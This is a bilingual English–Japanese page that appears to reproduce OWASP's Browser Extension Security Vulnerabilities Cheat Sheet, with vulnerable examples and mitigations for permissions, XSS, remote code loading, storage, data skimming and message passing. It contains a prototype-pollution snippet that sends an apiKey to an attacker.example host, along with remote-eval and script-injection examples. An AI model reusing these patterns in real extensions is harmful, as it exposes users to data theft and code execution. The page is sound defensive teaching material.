---
title: Browser Extension Vulnerabilities Cheat Sheet
hide_title: true
---

<div className="docHero" data-category="asvs-v10">
  <h1>ブラウザ拡張機能脆弱性チートシート</h1>
  <div className="docMeta">
    <span className="docPill">最終更新: 2026-05-21</span>
    <span className="docPill">読了時間: 約 15 分</span>
    <span className="docPill">カテゴリ: OAuth と OIDC</span>
  </div>
</div>

<div className="tabbedContent">
  <input className="tabInput" type="radio" name="browser-extension-vulnerabilities-view" id="browser-extension-vulnerabilities-original" />
  <input className="tabInput" type="radio" name="browser-extension-vulnerabilities-view" id="browser-extension-vulnerabilities-translation" defaultChecked />
  <input className="tabInput" type="radio" name="browser-extension-vulnerabilities-view" id="browser-extension-vulnerabilities-bilingual" />

  <div className="contentTabs">
    <label htmlFor="browser-extension-vulnerabilities-original" title="OWASP 原文">原文</label>
    <label htmlFor="browser-extension-vulnerabilities-translation" title="日本語訳">翻訳</label>
    <label htmlFor="browser-extension-vulnerabilities-bilingual" title="原文と翻訳を並べて確認">対比表示</label>
  </div>

<section id="browser-extension-vulnerabilities-original-panel" className="tabPanel originalPanel contentPanel">

# Browser Extension Security Vulnerabilities Cheat Sheet

## 1. Permissions Overreach

### Vulnerability: Permissions Overreach

Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.

### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### Mitigation: Permissions Overreach

Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed.

## 2. Data Leakage

### Vulnerability: Data Leakage

Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.

### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### Mitigation: Data Leakage

Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.

## 3. Cross-Site Scripting (XSS)

### Vulnerability: Cross-Site Scripting (XSS)

If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.

### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.

## 4. Insecure Communication

### Vulnerability: Insecure Communication

Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.

### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

### Mitigation: Insecure Communication

Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.

## 5. Code Injection

### Vulnerability: Code Injection

An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.

### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.

## 6. Malicious Updates

### Vulnerability: Malicious Updates

If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.

### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### Mitigation: Malicious Updates

Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
Implement integrity checks before executing any fetched code.

## 7. Third-Party Dependencies

### Vulnerability: Third-Party Dependencies

Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.

### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.

## 8. Lack of Content Security Policy (CSP)

### Vulnerability: Lack of Content Security Policy (CSP)

Without a strict CSP, attackers can inject scripts into an extension’s web pages, increasing the risk of cross-site scripting (XSS) attacks.

### Example: Lack of Content Security Policy (CSP)

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### Mitigation: Lack of Content Security Policy (CSP)

Define a strict CSP in the extension’s manifest.json file. Use nonce-based or hash-based policies to allow only trusted scripts. Block execution of inline scripts and restrict third-party content sources.

## 9. Insecure Storage

### Vulnerability: Insecure Storage

Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.

### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### Mitigation: Insecure Storage

Store sensitive data in Chrome Storage API, which provides better security than localStorage.
Encrypt stored data before saving it locally.
Never hardcode API keys or credentials within the extension code.

## 10. Insufficient Privacy Controls

### Vulnerability: Insufficient Privacy Controls

If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.

### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### Mitigation: Insufficient Privacy Controls

Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.

## 11. DOM-based Data Skimming

### Vulnerability: DOM-based Data Skimming

When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.

This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.

A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.

### Example: DOM-based Data Skimming

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### Mitigation: DOM-based Data Skimming

Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.

Use secure alternatives such as:

- Popup: Display information in a popup UI that appears when the user clicks the extension's icon.
- Options Page: Use a dedicated options page for displaying user-specific data or settings.
- Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)

It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot).

Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.

## 12. Prototype-based Data Skimming

### Vulnerability: Prototype-based Data Skimming

An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).

When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.

The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.

This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.

### Example: Prototype-based Data Skimming

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### Mitigation: Prototype-based Data Skimming

Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.

Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.

Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).

## 13. Insecure Message Passing

### Vulnerability: Insecure Message Passing

Browser extensions often rely on message passing (`chrome.runtime.sendMessage/onMessage`) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).

### Example: Insecure Message Passing

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

### Mitigation: Insecure Message Passing

Treat all incoming messages as untrusted input.
In Service Workers, always:

- Validate `sender.id` to ensure the message originates from your own extension.
- Validate `sender.url` or `sender.origin` to restrict which extension pages or content scripts may communicate.
- Avoid allowing webpages to indirectly influence privileged logic through content scripts.
- Perform strict validation and allow-listing of `request.action` and all request parameters.

Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## Conclusion

By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.

🔹 References:
[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)
[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)

</section>

<section id="browser-extension-vulnerabilities-translation-panel" className="tabPanel translationPanel contentPanel">

# ブラウザ拡張機能セキュリティ脆弱性チートシート

## 1. 権限の過剰要求

### 脆弱性: 権限の過剰要求

ブラウザ拡張機能は、実際に必要な範囲を超える権限を要求することがあります。これにより、すべてのタブ、閲覧履歴、さらにはセンシティブなユーザーデータへのアクセスが許可される可能性があります。拡張機能が侵害された場合、重大なプライバシーリスクにつながる可能性があります。

### 例: 権限の過剰要求

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### 対策: 権限の過剰要求

最小権限の原則 (Principle of Least Privilege, PoLP) に従い、絶対に必要な権限のみを要求します。可能な場合は、最初から完全なアクセスを付与するのではなく、任意権限を使用します。不要になった権限を定期的に監査し、削除します。

## 2. データ漏洩

### 脆弱性: データ漏洩

一部の拡張機能は、適切なセキュリティ対策なしに閲覧アクティビティや個人情報を外部サーバーに送信することで、意図せずユーザーデータを公開します。

### 例: データ漏洩

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### 対策: データ漏洩

データの傍受を防ぐため、すべての通信で常に HTTPS を使用します。データ収集を制限し、収集するデータをプライバシーポリシーで明確に示して透明性を確保します。個人データを収集または送信する前に、ユーザー同意の仕組みを実装します。

## 3. クロスサイトスクリプティング (XSS)

### 脆弱性: クロスサイトスクリプティング (XSS)

ユーザー入力が適切にサニタイズされていない場合、攻撃者は悪意のあるスクリプトを Web ページに注入し、ユーザーデータの窃取や不正操作を行う可能性があります。

### 例: クロスサイトスクリプティング (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### 対策: クロスサイトスクリプティング (XSS)

インラインスクリプトをブロックするために Content Security Policy (CSP) を実装します。ユーザー入力を表示する前に DOMPurify などのライブラリを使用してサニタイズします。注入されたスクリプトの実行を防ぐため、`innerHTML` の使用を避け、代わりに `textContent` を使用します。

## 4. 安全でない通信

### 脆弱性: 安全でない通信

一部の拡張機能は、保護されていない HTTP 接続でセンシティブデータを送信するため、攻撃者による傍受に対して脆弱になります。

### 例: 安全でない通信

```javascript
fetch('http://example.com/api/data');
```

### 対策: 安全でない通信

データ窃取を防ぐため、外部通信では常に HTTPS を使用します。データ完全性を確保するため、サーバーレスポンスを処理する前に検証します。

## 5. コードインジェクション

### 脆弱性: コードインジェクション

信頼できないソースからスクリプトを動的に読み込む拡張機能は、悪意のあるコードを注入および実行される可能性があります。

### 例: コードインジェクション

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### 対策: コードインジェクション

CSP (Content Security Policy) を使用してスクリプトソースを制限します。詳細については、[CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) を参照してください。悪意のあるコードを実行する可能性があるため、`eval()` と `innerHTML` の使用を避けます。Web ページにスクリプトを注入するのではなく、拡張機能のメッセージング API を使用することを推奨します。

## 6. 悪意のある更新

### 脆弱性: 悪意のある更新

拡張機能が信頼できないサーバーから更新を取得する場合、攻撃者がすべてのユーザーに悪意のある更新を配布できる可能性があります。

### 例: 悪意のある更新

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### 対策: 悪意のある更新

真正性を確保するため、デジタル署名で拡張機能の更新に署名します。拡張機能内で更新を取得するのではなく、拡張機能マーケットプレイスからの更新に依存します。["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices) を参照してください。取得したコードを実行する前に、完全性チェックを実装します。

## 7. サードパーティ依存関係

### 脆弱性: サードパーティ依存関係

古い、または脆弱なサードパーティライブラリを拡張機能で使用すると、それらのライブラリに既知の悪用方法がある場合にセキュリティリスクを持ち込む可能性があります。

### 例: サードパーティ依存関係

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### 対策: サードパーティ依存関係

セキュリティ脆弱性がないかサードパーティ依存関係を定期的に監査します。リスクを検出するため、`npm audit` や OWASP Dependency-Check などのツールを使用します。セキュリティ更新が頻繁に提供され、積極的に保守されているライブラリを優先します。

## 8. Content Security Policy (CSP) の欠如

### 脆弱性: Content Security Policy (CSP) の欠如

厳格な CSP がない場合、攻撃者は拡張機能の Web ページにスクリプトを注入でき、クロスサイトスクリプティング (XSS) 攻撃のリスクが高まります。

### 例: Content Security Policy (CSP) の欠如

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### 対策: Content Security Policy (CSP) の欠如

拡張機能の `manifest.json` ファイルで厳格な CSP を定義します。nonce ベースまたはハッシュベースのポリシーを使用し、信頼済みスクリプトのみを許可します。インラインスクリプトの実行をブロックし、サードパーティコンテンツのソースを制限します。

## 9. 安全でないストレージ

### 脆弱性: 安全でないストレージ

認証トークンのようなセンシティブデータを `localStorage` やその他の保護されていない場所に保存すると、攻撃者が容易にアクセスできるようになります。

### 例: 安全でないストレージ

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### 対策: 安全でないストレージ

センシティブデータは、`localStorage` よりも優れたセキュリティを提供する Chrome Storage API に保存します。ローカルに保存する前に保存データを暗号化します。拡張機能コード内に API キーや認証情報をハードコードしてはいけません。

## 10. 不十分なプライバシー管理

### 脆弱性: 不十分なプライバシー管理

拡張機能がユーザーデータをどのように収集し処理するかを明確に定義していない場合、プライバシー侵害や不正なデータ利用につながる可能性があります。

### 例: 不十分なプライバシー管理

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### 対策: 不十分なプライバシー管理

データ収集の実践を説明する明確なプライバシーポリシーを実装します。ユーザーがデータ収集をオプトアウトできるようにします。GDPR、CCPA、その他のプライバシー規制に準拠するため、データ共有の実践を開示します。

## 11. DOM ベースのデータスキミング

### 脆弱性: DOM ベースのデータスキミング

拡張機能がセンシティブなユーザー情報を Web ページの DOM に直接レンダリングすると、そのデータはページ自身のスクリプトからアクセス可能になります。

このリスクは、プレーンな JavaScript DOM 操作や React などのフレームワークで構築したコンポーネントの注入を含め、使用する方法にかかわらず適用されます。

悪意のある、または侵害された Web ページは DOM を検査し、センシティブデータ (個人を特定できる情報、金融情報、AI チャット履歴など) を読み取り、外部に送信できます。

### 例: DOM ベースのデータスキミング

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### 対策: DOM ベースのデータスキミング

センシティブ情報を Web ページの DOM に直接レンダリングすることは避けます。代わりに、Web ページのコンテキストから分離され、拡張機能によって制御される UI 要素にセンシティブデータを表示します。

次のような安全な代替手段を使用します。

- Popup: ユーザーが拡張機能のアイコンをクリックしたときに表示されるポップアップ UI に情報を表示します。
- Options Page: ユーザー固有のデータや設定を表示する専用のオプションページを使用します。
- Side Panel: ページコンテンツから分離された別ペインで永続的な UI を表示するためにサイドパネルを使用します。(参考: "Side Panel" は Chromium の用語です。Firefox では "Sidebar" と呼びます。)

カプセル化のために Shadow DOM を使用しても、ページスクリプトが `open` Shadow DOM を問い合わせできるため、十分な保護策にならない可能性がある点に注意することが重要です。さらに、セキュリティモデル上、他のブラウザ拡張機能を脅威として考慮する場合、`closed` Shadow DOM であっても安全ではありません。これは、拡張機能が [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot) を使用して `closed` Shadow DOM を突き抜けられるためです。

したがって、真に分離された、拡張機能が制御する UI を使用することが最も信頼できる対策です。

## 12. プロトタイプベースのデータスキミング

### 脆弱性: プロトタイプベースのデータスキミング

拡張機能のコンテンツスクリプトは、Web ページのコンテキストから分離された JavaScript コンテキストである "isolated world" で実行されます。一方で、拡張機能が Web ページのコンテキストである "main world" でスクリプトを実行する方法もいくつかあります。たとえば、拡張機能は [`web accessible resources`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources) のスクリプトを指す `src` 属性を持つ `<script>` タグを DOM に直接注入できます。

Web ページのコンテキストで実行されるスクリプト内で拡張機能がセンシティブなユーザー情報を使用すると、そのデータはページのスクリプトからアクセス可能になります。そのため、Web ページが侵害されている、または悪意のあるものである場合、データは窃取されます。

データがアクセス可能になる理由は、コンテキストのグローバルオブジェクト (「組み込みオブジェクト」、「primordials」、「prototypes」と呼ばれることもあります) が通常とは異なる振る舞いをするように上書きできるためです。これは「プロトタイプ汚染」、「プロトタイプ上書き」などとして知られています。

これは、悪意のある、または侵害された Web ページが、そのコンテキスト内のグローバルオブジェクトを上書きして、それらが扱うあらゆるデータを窃取できることを意味します。ここでいうオブジェクトには、関数など、コンテキスト内のほぼすべてが含まれる点に注意してください。そのため、拡張機能が注入したスクリプトが、センシティブデータとともにこれらの上書きされたオブジェクトを使用すると、意図せず悪意のあるコードを起動し、そのデータの外部送信につながります。

### 例: プロトタイプベースのデータスキミング

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### 対策: プロトタイプベースのデータスキミング

センシティブなユーザー情報を一瞬でも扱う場合は、Web ページのコンテキストを使用しないでください。Web ページのコンテキスト内のスクリプトとの通信が必要な場合は、センシティブではない、必要最小限の情報のみを使用します。たとえば、シークレットトークン全体ではなく、検証結果だけを渡します。これは `window.postMessage` を使用する場合でも同様です。`window.postMessage` も上書きでき、悪意のあるスクリプトが `message` イベントのリスナーを追加できるためです。

何らかのトリックでネイティブな (上書きされていない) プロトタイプを取得しようとすることは推奨されない点に注意してください。他のスクリプトも実行されているコンテキストでネイティブプロトタイプを取得するハックは確かに存在しますが、それらの対策を迂回する方法、つまり他のスクリプトに上書きされたプロトタイプを使わせる方法がしばしば考案されます。

また、拡張機能のスクリプトが `document_start` タイミングで実行される場合でも、ネイティブプロトタイプを使用できると仮定しないでください。少なくとも Chromium ブラウザ拡張機能の場合、新しく作成された iframe のコンテキストは、その iframe における `document_start` イベントで拡張機能のスクリプトが開始される前に、Web ページのスクリプトによって調整できることが知られています ([official bug issue](https://issues.chromium.org/issues/40202434))。

## 13. 安全でないメッセージ受け渡し

### 脆弱性: 安全でないメッセージ受け渡し

ブラウザ拡張機能は、低権限のコンテキスト (Content Scripts、Popup) と高権限の Service Worker (Background) の間でメッセージ受け渡し (`chrome.runtime.sendMessage/onMessage`) に依存することがよくあります。Service Worker が送信者のオリジンや URL を検証しない場合、侵害された Web ページが悪意のあるメッセージを送信し、拡張機能をだまして特権操作 (センシティブデータや API キーの取得など) を実行させる可能性があります。

### 例: 安全でないメッセージ受け渡し

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

### 対策: 安全でないメッセージ受け渡し

すべての受信メッセージを信頼できない入力として扱います。Service Worker では常に次を行います。

- `sender.id` を検証し、メッセージが自分の拡張機能から発信されたことを確認します。
- `sender.url` または `sender.origin` を検証し、通信を許可する拡張機能ページやコンテンツスクリプトを制限します。
- Web ページがコンテンツスクリプトを介して特権ロジックに間接的に影響を与えられるようにすることを避けます。
- `request.action` とすべてのリクエストパラメータを厳格に検証し、許可リスト化します。

Chrome は、コンテンツスクリプトは拡張機能ページより信頼性が低く、それに応じて扱う必要があると明示しています。安全な例:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## まとめ

これらのセキュリティベストプラクティスに従うことで、開発者はより安全なブラウザ拡張機能を構築し、プライバシーおよびセキュリティ上の脅威からユーザーを保護できます。拡張機能を開発する際は、常に最小権限、暗号化、セキュアコーディングの原則を優先してください。

References:

[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)

[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)

</section>

<section id="browser-extension-vulnerabilities-bilingual-panel" className="tabPanel bilingualPanel">

<div className="bilingualPair">
<div className="bilingualBlock englishBlock">
<span className="bilingualLabel english">English (原文)</span>

# Browser Extension Security Vulnerabilities Cheat Sheet

## 1. Permissions Overreach

### Vulnerability: Permissions Overreach

Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.

### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### Mitigation: Permissions Overreach

Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed.

## 2. Data Leakage

### Vulnerability: Data Leakage

Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.

### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### Mitigation: Data Leakage

Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.

## 3. Cross-Site Scripting (XSS)

### Vulnerability: Cross-Site Scripting (XSS)

If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.

### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.

## 4. Insecure Communication

### Vulnerability: Insecure Communication

Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.

### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

### Mitigation: Insecure Communication

Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.

## 5. Code Injection

### Vulnerability: Code Injection

An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.

### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.

## 6. Malicious Updates

### Vulnerability: Malicious Updates

If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.

### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### Mitigation: Malicious Updates

Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
Implement integrity checks before executing any fetched code.

## 7. Third-Party Dependencies

### Vulnerability: Third-Party Dependencies

Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.

### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.

## 8. Lack of Content Security Policy (CSP)

### Vulnerability: Lack of Content Security Policy (CSP)

Without a strict CSP, attackers can inject scripts into an extension’s web pages, increasing the risk of cross-site scripting (XSS) attacks.

### Example: Lack of Content Security Policy (CSP)

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### Mitigation: Lack of Content Security Policy (CSP)

Define a strict CSP in the extension’s manifest.json file. Use nonce-based or hash-based policies to allow only trusted scripts. Block execution of inline scripts and restrict third-party content sources.

## 9. Insecure Storage

### Vulnerability: Insecure Storage

Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.

### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### Mitigation: Insecure Storage

Store sensitive data in Chrome Storage API, which provides better security than localStorage.
Encrypt stored data before saving it locally.
Never hardcode API keys or credentials within the extension code.

## 10. Insufficient Privacy Controls

### Vulnerability: Insufficient Privacy Controls

If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.

### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### Mitigation: Insufficient Privacy Controls

Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.

## 11. DOM-based Data Skimming

